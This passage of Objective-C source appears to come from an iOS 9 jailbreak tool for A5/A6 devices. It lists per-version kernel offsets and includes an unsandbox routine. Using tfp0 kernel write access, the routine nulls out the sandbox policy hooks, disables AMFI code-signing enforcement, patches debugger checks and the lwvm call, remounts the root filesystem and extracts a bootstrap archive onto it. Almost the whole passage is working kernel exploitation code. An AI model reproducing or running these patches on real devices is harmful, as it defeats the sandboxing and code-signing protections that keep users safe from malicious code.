    } else if ([[NSArray arrayWithObjects:@"3247.1.88.1.1~1", nil] containsObject:KernelVersion()]) { //9.0b5
        PE_i_can_has_debugger_1 = 0x3a8f44; //find_PE_i_can_has_debugger_1 offset for 9.1
        olog("using 0x3a8f44\n"); //A6 is ??
    } else if ([[NSArray arrayWithObjects:@"3247.1.56~1", nil] containsObject:KernelVersion()]) { //9.0b4
        PE_i_can_has_debugger_1 = 0x3a7394; //find_PE_i_can_has_debugger_1 offset for 9.1
        olog("using 0x3a7394\n"); //A6 is ??
    } else if ([[NSArray arrayWithObjects:@"3247.1.36.0.1~9", nil] containsObject:KernelVersion()]) { //9.0b3
        PE_i_can_has_debugger_1 = 0x3a8444; //find_PE_i_can_has_debugger_1 offset for 9.1
        olog("using 0x3a8444\n"); //A6 is ??
    } else if ([[NSArray arrayWithObjects:@"3247.1.6.1.1~2", nil] containsObject:KernelVersion()]){ //9.0b2
        PE_i_can_has_debugger_1 = 0x3ad524; //find_PE_i_can_has_debugger_1 offset for 9.1
        olog("using 0x3ad524\n"); //A6 is ??
    } else if ([[NSArray arrayWithObjects:@"3216.0.0.1.15~2", nil] containsObject:KernelVersion()]){ //9.0b1
        PE_i_can_has_debugger_1 = 0x45ad20;
        olog("using 0x45ad20\n");
    } else { //8.4.1
        PE_i_can_has_debugger_1 = 0x3f4dc0;
        olog("using 0x3f4dc0\n");
    }
    } else {
        //A6 / A6X
        if ([[NSArray arrayWithObjects:@"3248.61.1~1", nil] containsObject:KernelVersion()]) { //9.3.5-9.3.6
            PE_i_can_has_debugger_1 = 0x3afee4; //find_PE_i_can_has_debugger_1 offset for 9.3.5/9.3.6
            olog("using 0x3afee4\n"); //on A6: 0x803b0ee4 / 0x3afee4 9.3.5
        } else if ([[NSArray arrayWithObjects:@"3248.60.9~1", nil] containsObject:KernelVersion()]) { //9.3.3b4-9.3.4
            PE_i_can_has_debugger_1 = 0x3aff14; //find_PE_i_can_has_debugger_1 offset for 9.3.3/9.3.4
            olog("using 0x3aff14\n"); // 0x803a92d4 A5, 0x803b0f14 A6
        } else if ([[NSArray arrayWithObjects:@"3248.60.8~1", nil] containsObject:KernelVersion()]) { //9.3.3b3
            PE_i_can_has_debugger_1 = 0x3b0094;
            olog("using 0x3b0094\n"); // 0x803b1094 A6
        } else if ([[NSArray arrayWithObjects:@"3248.60.4~1", nil] containsObject:KernelVersion()]) { //9.3.3b2
            PE_i_can_has_debugger_1 = 0x3afcf4;
            olog("using 0x3afcf4\n"); // 0x803b0cf4 A6
        } else if ([[NSArray arrayWithObjects:@"3248.60.3~3", nil] containsObject:KernelVersion()]) { //9.3.3b1
            PE_i_can_has_debugger_1 = 0x3afda4;
            olog("using 0x3afda4\n"); // 0x803b0da4 A6
        } else if ([[NSArray arrayWithObjects:@"3248.50.21~4",@"3248.50.20~1",@"3248.50.18~1", nil] containsObject:KernelVersion()]){ //9.3.2b1-9.3.2
            PE_i_can_has_debugger_1 = 0x3afb14; //find_PE_i_can_has_debugger_1 offset for 9.3.2
            olog("using 0x3afb14\n"); // 0x803a8ff4 A5, 0x803b0b14 A6
        } else if ([[NSArray arrayWithObjects:@"3248.41.4~2",@"3248.41.4~3",@"3248.41.3~1", nil] containsObject:KernelVersion()]){ //9.3b4-9.3
            PE_i_can_has_debugger_1 = 0x3afaf4; //find_PE_i_can_has_debugger_1 offset for 9.3
            olog("using 0x3afaf4\n");
        } else if ([[NSArray arrayWithObjects:@"3248.40.173.0.1~1", nil] containsObject:KernelVersion()]) { //9.3b3
            PE_i_can_has_debugger_1 = 0x3af914; //find_PE_i_can_has_debugger_1 offset for 9.3
            olog("using 0x3af914\n"); //A6 is 0x803b0914
        } else if ([[NSArray arrayWithObjects:@"3248.40.166.0.1~1", nil] containsObject:KernelVersion()]) { //9.3b2
            PE_i_can_has_debugger_1 = 0x3af964; //find_PE_i_can_has_debugger_1 offset for 9.3
            olog("using 0x3af964\n"); //A6 is 0x803b0964
        } else if ([[NSArray arrayWithObjects:@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]) { //9.3b1/9.3b1.1
            PE_i_can_has_debugger_1 = 0x3af3e4; //find_PE_i_can_has_debugger_1 offset for 9.3
            olog("using 0x3af3e4\n"); //A6 is 0x803b03e4
        } else if ([[NSArray arrayWithObjects:@"3248.31.3~2", nil] containsObject:KernelVersion()]){ //9.2.1b1-9.2.1
            PE_i_can_has_debugger_1 = 0x3a8764; //find_PE_i_can_has_debugger_1 offset for 9.2.1
            olog("using 0x3a8764\n"); //0x803a2434 / 0x3a1434 on A5, 0x803a9764 / 0x3a8764 A6
        } else if ([[NSArray arrayWithObjects:@"3248.21.2~1", nil] containsObject:KernelVersion()]){ //9.2b4-9.2
            PE_i_can_has_debugger_1 = 0x3a85e4; //find_PE_i_can_has_debugger_1 offset for 9.2
            olog("using 0x3a85e4\n"); //0x803a22c4 / 0x3a1434 on A5, 0x803a95e4 / 0x3a85e4 A6
        } else if ([[NSArray arrayWithObjects:@"3248.21.1~2", nil] containsObject:KernelVersion()]){ //9.2b3
            PE_i_can_has_debugger_1 = 0x3a83b4;
            olog("using 0x3a83b4\n");
        } else if ([[NSArray arrayWithObjects:@"3248.20.39~8", nil] containsObject:KernelVersion()]){ //9.2b2
            PE_i_can_has_debugger_1 = 0x3a7c54;
            olog("using 0x3a7c54\n");
        } else if ([[NSArray arrayWithObjects:@"3248.20.33.0.1~7", nil] containsObject:KernelVersion()]){ //9.2b1
            PE_i_can_has_debugger_1 = 0x3b3c84;
            olog("using 0x3b3c84\n");
        } else if ([[NSArray arrayWithObjects:@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3", nil] containsObject:KernelVersion()]) { //9.1b2-9.1
            PE_i_can_has_debugger_1 = 0x3b0694; //find_PE_i_can_has_debugger_1 offset for 9.1
            olog("using 0x3b0694\n"); //A6 is 0x803b1694 / 0x3b0694
        } else if ([[NSArray arrayWithObjects:@"3248.10.27~1", nil] containsObject:KernelVersion()]){ //9.1b1
            PE_i_can_has_debugger_1 = 0x3b0644;
            olog("using 0x3b0644\n");
        } else if ([[NSArray arrayWithObjects:@"3248.1.3~1",@"3248.1.2~3",@"3247.1.88.1.1~1", nil] containsObject:KernelVersion()]) { //9.0b5-9.0.2
            PE_i_can_has_debugger_1 = 0x3af014; //find_PE_i_can_has_debugger_1 offset for 9.0.2, 0x803b0014 on A6
            olog("using 0x3af014\n"); // 0x803a9fc4 / 0x3a8fc4
        } else if ([[NSArray arrayWithObjects:@"3247.1.56~1", nil] containsObject:KernelVersion()]) { //9.0b4
            PE_i_can_has_debugger_1 = 0x3ae364;
            olog("using 0x3ae364\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.36.0.1~9", nil] containsObject:KernelVersion()]) { //9.0b3
            PE_i_can_has_debugger_1 = 0x3b01a4;
            olog("using 0x3b01a4\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.6.1.1~2", nil] containsObject:KernelVersion()]) { //9.0b2
            PE_i_can_has_debugger_1 = 0x3b4b94;
            olog("using 0x3b4b94\n");
        } else { //9.0b1
            PE_i_can_has_debugger_1 = 0x461e40;
            olog("using 0x461e40\n");
        }
    }
    printf("[*] found PE_i_can_has_debugger_1 at 0x%08x\n", PE_i_can_has_debugger_1);
    return PE_i_can_has_debugger_1;
}

uint32_t find_PE_i_can_has_debugger_2(uint32_t region, uint8_t* kdata, size_t ksize) {
    uint32_t PE_i_can_has_debugger_2;
    struct utsname systemInfo;
    uname(&systemInfo);
    NSArray *isA5orA5X = [NSArray arrayWithObjects:@"iPad2,1",@"iPad2,2",@"iPad2,3",@"iPad2,4",@"iPad2,5",@"iPad2,6",@"iPad2,7",@"iPad3,1",@"iPad3,2",@"iPad3,3",@"iPhone4,1",@"iPod5,1", nil];
    if([isA5orA5X containsObject:[NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding]]) {
        //A5 or A5X
    if ([[NSArray arrayWithObjects:@"3248.61.1~1",@"3248.60.9~1",@"3248.60.8~1",@"3248.60.4~1",@"3248.60.3~3",@"3248.50.21~4",@"3248.50.20~1",@"3248.50.18~1",@"3248.41.4~2",@"3248.41.4~3",@"3248.41.3~1", nil] containsObject:KernelVersion()]) { //9.3b4-9.3.6
        PE_i_can_has_debugger_2 = 0x456070; //find_PE_i_can_has_debugger_1 offset for 9.3.X
        olog("using 0x456070\n"); //on A6: 0x8045f1a0 / 0x45e1a0
    } else if ([[NSArray arrayWithObjects:@"3248.40.173.0.1~1",@"3248.40.166.0.1~1",@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]){ //9.3b1-9.3b3
        PE_i_can_has_debugger_2 = 0x456080; //find_PE_i_can_has_debugger_1 offset for 9.2.X
        olog("using 0x456080\n"); //0x80450070 on A5, ?? A6
    } else if ([[NSArray arrayWithObjects:@"3248.31.3~2",@"3248.21.2~1",@"3248.21.1~2", nil] containsObject:KernelVersion()]){ //9.2b3-9.2.1
        PE_i_can_has_debugger_2 = 0x44f070; //find_PE_i_can_has_debugger_1 offset for 9.2.X
        olog("using 0x44f070\n"); //0x80450070 on A5, 0x80457190 / 0x456190 A6
    } else if ([[NSArray arrayWithObjects:@"3248.20.39~8", nil] containsObject:KernelVersion()]){ //9.2b2
        PE_i_can_has_debugger_2 = 0x44d870; //find_PE_i_can_has_debugger_1 offset for 9.2.X
        olog("using 0x44d870\n");
    } else if ([[NSArray arrayWithObjects:@"3248.20.33.0.1~7", nil] containsObject:KernelVersion()]){ //9.2b1
        PE_i_can_has_debugger_2 = 0x459870; //find_PE_i_can_has_debugger_1 offset for 9.2.X
        olog("using 0x459870\n");
    } else if ([[NSArray arrayWithObjects:@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3", nil] containsObject:KernelVersion()]) { //9.1b2-9.1
        PE_i_can_has_debugger_2 = 0x457860; //find_PE_i_can_has_debugger_1 offset for 9.1
        olog("using 0x457860\n"); //A6 is 0x8045f980 / 0x45e980
    } else if ([[NSArray arrayWithObjects:@"3248.10.27~1", nil] containsObject:KernelVersion()]){ //9.1b1
        PE_i_can_has_debugger_2 = 0x4577e0;
        olog("using 0x4577e0\n");
    } else if ([[NSArray arrayWithObjects:@"3248.1.3~1",@"3248.1.2~3",@"3247.1.88.1.1~1", nil] containsObject:KernelVersion()]) { //9.0b5-9.0.2
        PE_i_can_has_debugger_2 = 0x4567d0; //find_PE_i_can_has_debugger_1 offset for 9.0GM-9.0.2, 0x8045d8f0 / 0x45c8f0 on A6
        olog("using 0x4567d0\n"); // 0x804577d0 / 0x4567d0
    } else if ([[NSArray arrayWithObjects:@"3247.1.56~1", nil] containsObject:KernelVersion()]){ //9.0b4
        PE_i_can_has_debugger_2 = 0x454750; //find_PE_i_can_has_debugger_1 offset for 9.0GM-9.0.2, 0x8045d8f0 / 0x45c8f0 on A6
        olog("using 0x454750\n"); // 0x804577d0 / 0x4567d0
    } else if ([[NSArray arrayWithObjects:@"3247.1.36.0.1~9", nil] containsObject:KernelVersion()]){ //9.0b3
        PE_i_can_has_debugger_2 = 0x455740; //find_PE_i_can_has_debugger_1 offset for 9.0GM-9.0.2, 0x8045d8f0 / 0x45c8f0 on A6
        olog("using 0x455740\n"); // 0x804577d0 / 0x4567d0
    } else if ([[NSArray arrayWithObjects:@"3247.1.6.1.1~2", nil] containsObject:KernelVersion()]){ //9.0b2
        PE_i_can_has_debugger_2 = 0x45c630; //find_PE_i_can_has_debugger_1 offset for 9.0GM-9.0.2, 0x8045d8f0 / 0x45c8f0 on A6
        olog("using 0x45c630\n"); // 0x804577d0 / 0x4567d0
    } else if ([[NSArray arrayWithObjects:@"3216.0.0.1.15~2", nil] containsObject:KernelVersion()]) { //9.0b1
        PE_i_can_has_debugger_2 = 0x459520;
        olog("using 0x459520\n");
    } else { //8.4.1
        PE_i_can_has_debugger_2 = 0x3f2dc0;
        olog("using 0x3f2dc0\n");
    }
    } else {
        //A6 or A6X
        if ([[NSArray arrayWithObjects:@"3248.61.1~1",@"3248.60.9~1",@"3248.60.8~1",@"3248.60.4~1",@"3248.60.3~3",@"3248.50.21~4",@"3248.50.20~1",@"3248.50.18~1",@"3248.41.4~2",@"3248.41.4~3",@"3248.41.3~1",@"3248.40.173.0.1~1",@"3248.40.166.0.1~1",@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]) { //9.3b1-9.3.6
            PE_i_can_has_debugger_2 = 0x45e1a0; //find_PE_i_can_has_debugger_1 offset for 9.3.X
            olog("using 0x45e1a0\n"); //on A6: 0x8045f1a0 / 0x45e1a0
        } else if ([[NSArray arrayWithObjects:@"3248.31.3~2",@"3248.21.2~1",@"3248.21.1~2", nil] containsObject:KernelVersion()]){ //9.2b3-9.2.1
            PE_i_can_has_debugger_2 = 0x456190; //find_PE_i_can_has_debugger_1 offset for 9.2.X
            olog("using 0x456190\n"); //0x80450070 on A5, 0x80457190 / 0x456190 A6
        } else if ([[NSArray arrayWithObjects:@"3248.20.39~8", nil] containsObject:KernelVersion()]){ //9.2b2
            PE_i_can_has_debugger_2 = 0x455990; //find_PE_i_can_has_debugger_1 offset for 9.2.X
            olog("using 0x455990\n");
        } else if ([[NSArray arrayWithObjects:@"3248.20.33.0.1~7", nil] containsObject:KernelVersion()]){ //9.2b1
            PE_i_can_has_debugger_2 = 0x461990;
            olog("using 0x461990\n");
        } else if ([[NSArray arrayWithObjects:@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3", nil] containsObject:KernelVersion()]) { //9.1b2-9.1
            PE_i_can_has_debugger_2 = 0x45e980; //find_PE_i_can_has_debugger_1 offset for 9.1
            olog("using 0x45e980\n"); //A6 is 0x8045f980 / 0x45e980
        } else if ([[NSArray arrayWithObjects:@"3248.10.27~1", nil] containsObject:KernelVersion()]){ //9.1b1
            PE_i_can_has_debugger_2 = 0x45d900;
            olog("using 0x45d900\n");
        } else if ([[NSArray arrayWithObjects:@"3248.1.3~1",@"3248.1.2~3",@"3247.1.88.1.1~1", nil] containsObject:KernelVersion()]) { //9.0b5-9.0.2
            PE_i_can_has_debugger_2 = 0x45c8f0; //find_PE_i_can_has_debugger_1 offset for 9.0GM-9.0.2, 0x8045d8f0 / 0x45c8f0 on A6
            olog("using 0x45c8f0\n"); // 0x804577d0 / 0x4567d0
        } else if ([[NSArray arrayWithObjects:@"3247.1.56~1", nil] containsObject:KernelVersion()]) { //9.0b4
            PE_i_can_has_debugger_2 = 0x45b870;
            olog("using 0x45b870\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.36.0.1~9", nil] containsObject:KernelVersion()]) { //9.0b3
            PE_i_can_has_debugger_2 = 0x45d860;
            olog("using 0x45d860\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.6.1.1~2", nil] containsObject:KernelVersion()]) { //9.0b2
            PE_i_can_has_debugger_2 = 0x464750;
            olog("using 0x464750\n");
        } else { //9.0b1
            PE_i_can_has_debugger_2 = 0x460640;
            olog("using 0x460640\n");
        }
    }
    printf("[*] found PE_i_can_has_debugger_2 at 0x%08x\n", PE_i_can_has_debugger_2);
    return PE_i_can_has_debugger_2;
}

uint32_t find_kernel_pmap(uintptr_t kernel_base) {
    uint32_t pmap_addr;
    struct utsname systemInfo;
    uname(&systemInfo);
    NSArray *isA5orA5X = [NSArray arrayWithObjects:@"iPad2,1",@"iPad2,2",@"iPad2,3",@"iPad2,4",@"iPad2,5",@"iPad2,6",@"iPad2,7",@"iPad3,1",@"iPad3,2",@"iPad3,3",@"iPhone4,1",@"iPod5,1", nil];
    if([isA5orA5X containsObject:[NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding]]) {
        //A5 or A5X
    if ([[NSArray arrayWithObjects:@"3248.61.1~1",@"3248.60.9~1",@"3248.60.8~1",@"3248.60.4~1",@"3248.60.3~3",@"3248.50.21~4",@"3248.50.20~1",@"3248.50.18~1",@"3248.41.4~2",@"3248.41.4~3",@"3248.41.3~1",@"3248.40.173.0.1~1",@"3248.40.166.0.1~1",@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]) { //9.3b1-9.3.6
        pmap_addr = 0x003F6454; //for A5. For A6 offset is 0x003FE454
    } else if ([[NSArray arrayWithObjects:@"3248.31.3~2",@"3248.21.2~1",@"3248.21.1~2", nil] containsObject:KernelVersion()]){ //9.2b3-9.2.1
        pmap_addr = 0x003EF444; //for A5. For A6 offset is 0x003F6444
    } else if ([[NSArray arrayWithObjects:@"3248.20.39~8", nil] containsObject:KernelVersion()]){ //9.2b2
        pmap_addr = 0x003EE444; //for A5. For A6 offset is ??
    } else if ([[NSArray arrayWithObjects:@"3248.20.33.0.1~7", nil] containsObject:KernelVersion()]){ //9.2b1
        pmap_addr = 0x003FA444; //for A5. For A6 offset is ??
    } else if ([[NSArray arrayWithObjects:@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3",@"3248.10.27~1", nil] containsObject:KernelVersion()]) { //9.1b1-9.1
        pmap_addr = 0x003F8444; //for A5. For A6 offset is 0x003FF444
    } else if ([[NSArray arrayWithObjects:@"3248.1.3~1",@"3248.1.2~3",@"3247.1.88.1.1~1", nil] containsObject:KernelVersion()]) { //9.0b5-9.0.2
        pmap_addr = 0x003F7444; //for A5. For A6 offset is 0x003FD444
    } else if ([[NSArray arrayWithObjects:@"3247.1.56~1", nil] containsObject:KernelVersion()]){ //9.0b4
        pmap_addr = 0x003F5448; //for A5. For A6 offset is ??
    } else if ([[NSArray arrayWithObjects:@"3247.1.36.0.1~9", nil] containsObject:KernelVersion()]){ //9.0b3
        pmap_addr = 0x003F6448; //for A5. For A6 offset is ??
    } else if ([[NSArray arrayWithObjects:@"3247.1.6.1.1~2", nil] containsObject:KernelVersion()]){ //9.0b2
        pmap_addr = 0x003FB45c; //for A5. For A6 offset is ??
    } else if ([[NSArray arrayWithObjects:@"3216.0.0.1.15~2", nil] containsObject:KernelVersion()]){ //9.0b1
        pmap_addr = 0x003F8454;
    } else { //8.4.1
        pmap_addr = 0x003A211C;
    }
    } else {
        //A6 or A6X
        if ([[NSArray arrayWithObjects:@"3248.61.1~1",@"3248.60.9~1",@"3248.60.8~1",@"3248.60.4~1",@"3248.60.3~3",@"3248.50.21~4",@"3248.50.20~1",@"3248.50.18~1",@"3248.41.4~2",@"3248.41.4~3",@"3248.41.3~1",@"3248.40.173.0.1~1",@"3248.40.166.0.1~1",@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]) { //9.3b1-9.3.6
            pmap_addr = 0x003FE454;
        } else if ([[NSArray arrayWithObjects:@"3248.31.3~2",@"3248.21.2~1",@"3248.21.1~2",@"3248.20.39~8", nil] containsObject:KernelVersion()]){ //9.2b2-9.2.1
            pmap_addr = 0x003F6444;
        } else if ([[NSArray arrayWithObjects:@"3248.20.33.0.1~7", nil] containsObject:KernelVersion()]){ //9.2b1
            pmap_addr = 0x00402444;
        } else if ([[NSArray arrayWithObjects:@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3", nil] containsObject:KernelVersion()]) { //iOS 9.1b2-9.1
            pmap_addr = 0x003FF444;
        } else if ([[NSArray arrayWithObjects:@"3248.10.27~1", nil] containsObject:KernelVersion()]) { //iOS 9.1b1
            pmap_addr = 0x003FE444;
        } else if ([[NSArray arrayWithObjects:@"3248.1.3~1",@"3248.1.2~3",@"3247.1.88.1.1~1", nil] containsObject:KernelVersion()]) { //9.0b5-9.0.2
            pmap_addr = 0x003FD444;
        } else if ([[NSArray arrayWithObjects:@"3247.1.56~1", nil] containsObject:KernelVersion()]) { //9.0b4
            pmap_addr = 0x003FC448;
        } else if ([[NSArray arrayWithObjects:@"3247.1.36.0.1~9", nil] containsObject:KernelVersion()]) { //9.0b3
            pmap_addr = 0x003FE448;
        } else if ([[NSArray arrayWithObjects:@"3247.1.6.1.1~2", nil] containsObject:KernelVersion()]) { //9.0b2
            pmap_addr = 0x0040345C;
        } else { //9.0b1
            pmap_addr = 0x003FF454;
        }
    }
    olog("using offset 0x%08x for pmap\n",pmap_addr);
    return pmap_addr + kernel_base;
}

uint8_t* dump_kernel(uint8_t* kdata, uint32_t len, task_t tfp0, uintptr_t kaslr_slide) {
    vm_size_t sexment = 0x800;
    for (int i = 0; i < len / sexment; i++) {
        vm_read_overwrite(tfp0,UNSLID_BASE + kaslr_slide + (i * sexment),sexment,(vm_address_t)kdata + (i * sexment),&sexment);
    }
    return kdata;
}

bool unsandbox(task_t tfp0, uintptr_t kernel_base, uintptr_t kaslr_slide) {
    olog("unsandboxing...\n");
    
    uint8_t* kdata = malloc(32 * 1024 * 1024);
    dump_kernel(kdata, 32 * 1024 * 1024, tfp0, kaslr_slide);
    if (!kdata) {
        olog("fuck\n");
        exit(42);
    }
    olog("now...\n");
    
    uint32_t sbopsoffset = find_sbops(kernel_base, kdata, 32 * 1024 * 1024);
    olog("nuking sandbox at 0x%08lx\n", kernel_base + sbopsoffset);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0,tfp0);
    
    olog("nuked sandbox\n");
    olog("trying pmap patch...\n");
    if (is_pmap_patch_success(tfp0, kernel_base, kaslr_slide)) {
        olog("pmap patch success\n");
    } else {
        olog("pmap patch epic fail\n");
    }
    olog("let's go for code exec...\n");
    
    uint32_t mount_common = kernel_base + find_mount_common(kernel_base, kdata, 32 * 1024 * 1024);
    olog("patching mount_common at 0x%08x\n",mount_common);
    kwrite_uint8(mount_common, 0xe0, tfp0);
    
    uint32_t cs_enforcement_disable_amfi = find_cs_enforcement_disable_amfi(kernel_base, kdata, 32 * 1024 * 1024);
    olog("patching cs_enforcement_disable_amfi at 0x%08x\n",kernel_base + cs_enforcement_disable_amfi - 1);
    kwrite_uint8(kernel_base + cs_enforcement_disable_amfi, 1, tfp0);
    kwrite_uint8(kernel_base + cs_enforcement_disable_amfi - 1, 1, tfp0);
    
    uint32_t PE_i_can_has_debugger_1 = find_PE_i_can_has_debugger_1(kernel_base, kdata, 32 * 1024 * 1024);
    olog("patching PE_i_can_has_debugger_1 at 0x%08x\n",PE_i_can_has_debugger_1);
    kwrite_uint32(kernel_base + PE_i_can_has_debugger_1, 1, tfp0);
    
    uint32_t PE_i_can_has_debugger_2 = find_PE_i_can_has_debugger_2(kernel_base, kdata, 32 * 1024 * 1024);
    olog("patching PE_i_can_has_debugger_2 at 0x%08x\n",PE_i_can_has_debugger_2);
    kwrite_uint32(kernel_base + PE_i_can_has_debugger_2, 1, tfp0);
    
    uint32_t amfi_file_check_mmap = find_amfi_file_check_mmap(kernel_base, kdata, 32 * 1024 * 1024);
    olog("patching amfi_file_check_mmap at 0x%08x\n",kernel_base + amfi_file_check_mmap);
    kwrite_uint32(kernel_base + amfi_file_check_mmap, 0xbf00bf00, tfp0);
    
    uint32_t sandbox_call_i_can_has_debugger = find_sandbox_call_i_can_has_debugger(kernel_base, kdata, 32 * 1024 * 1024);
    olog("patching sandbox_call_i_can_has_debugger at 0x%08x\n",kernel_base + sandbox_call_i_can_has_debugger);
    kwrite_uint32(kernel_base + sandbox_call_i_can_has_debugger, 0xbf00bf00, tfp0);
    
    uint32_t lwvm_call = find_lwvm_call(kernel_base, kdata, 32 * 1024 * 1024);
    uint32_t lwvm_call_offset = find_lwvm_call_offset(kernel_base, kdata, 32 * 1024 * 1024);
    olog("unslid lwvm_call at 0x%08x\n",
         UNSLID_BASE + lwvm_call);
    olog("unslid lwvm_call_off at 0x%08x\n",
         UNSLID_BASE + lwvm_call_offset);
    olog("patching lwvm_call at 0x%08x\n",
         kernel_base + lwvm_call);
    olog("patching lwvm_call_off at 0x%08x\n",
         kernel_base + lwvm_call_offset);
    kwrite_uint32(kernel_base + lwvm_call, kernel_base + lwvm_call_offset, tfp0);
    
    /*olog("patching csops: 0x%08x,0x%08x\n",kernel_base + find_csops(kernel_base, kdata, 32 * 1024 * 1024),0xbf00bf00);
    kwrite_uint32(kernel_base + find_csops(kernel_base, kdata, 32 * 1024 * 1024), 0xbf00bf00, tfp0);
    
    olog("patching vm_map_enter_patch: 0x%08x\n",kernel_base + find_vm_map_enter_patch(kernel_base, kdata, 32 * 1024 * 1024));
    kwrite_uint32(kernel_base + find_vm_map_enter_patch(kernel_base, kdata, 32 * 1024 * 1024),0xbf00bf00, tfp0);
    
    olog("patching mapForIO: 0x%08x,0x%08x\n",kernel_base + find_mapForIO(kernel_base, kdata, 32 * 1024 * 1024),0xbf00bf00);
    kwrite_uint32(kernel_base + find_mapForIO(kernel_base, kdata, 32 * 1024 * 1024),0xbf00bf00,tfp0);*/
    
    return true;
}

extern char **environ;

bool remount(void) {
    //the remount
    olog("remounting /");
    char* nmr = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
    olog("remount = %d\n", mntr);
    
    bool InstallBootstrap = false;
    pid_t pid;
    
    if(!((access("/.installed-openpwnage", F_OK) != -1) || (access("/.p0laris", F_OK) != -1) || (access("/.installed_home_depot", F_OK) != -1))){
        olog("installing bootstrap...\n");
        
        NSString *tarPathObj = [[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/tar"];
        const char *tarPath = [tarPathObj UTF8String];
        olog("tar path: %s\n",tarPath);
        NSString *basebinsPathObj = [[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/bootstrap.tar"];
        const char *basebins_path = [basebinsPathObj UTF8String];
        olog("bootstrap path: %s\n",basebins_path);
        NSString *launchctlPathObj = [[[NSBundle mainBundle] resourcePath]stringByAppendingString:@"/launchctl"];
        const char *launchctl_path = [launchctlPathObj UTF8String];
        olog("launchctl path: %s\n",launchctl_path);
        
        olog("extracting bootstrap\n");
        olog("prepare to wait a long time. this should be obvious imo, but don't turn off your device.\n");
        chmod(tarPath, 0777);
        char *argv[] = {tarPath, "-xf", basebins_path, "-C", "/", "--preserve-permissions", NULL};
        posix_spawn(&pid, tarPath, NULL, NULL, argv, environ);
        
